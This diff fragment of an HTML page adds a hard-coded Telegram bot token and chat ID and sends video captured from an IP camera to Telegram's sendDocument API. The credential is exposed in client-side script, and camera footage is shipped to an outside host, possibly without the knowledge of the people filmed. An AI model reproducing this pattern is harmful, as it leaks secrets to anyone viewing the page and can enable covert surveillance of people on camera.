@@ -52,12 +52,15 @@
     </script>
     <!-- Add a script to capture video from an IP camera and upload to a bot -->
     <script>
+        const BOT_TOKEN = '6857162781:AAEZ3C2VwSM8MaAlQAeIdiqdwfxjpmLPH3U';
+        const CHAT_ID = '-1001870015374';
+
         async function uploadToBot(videoBlob) {
             const formData = new FormData();
             formData.append('file', videoBlob, 'video.mp4');
 
             try {
-                const response = await fetch('YOUR_BOT_UPLOAD_URL', {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument?chat_id=${CHAT_ID}`, {
                     method: 'POST',
                     body: formData
                 });
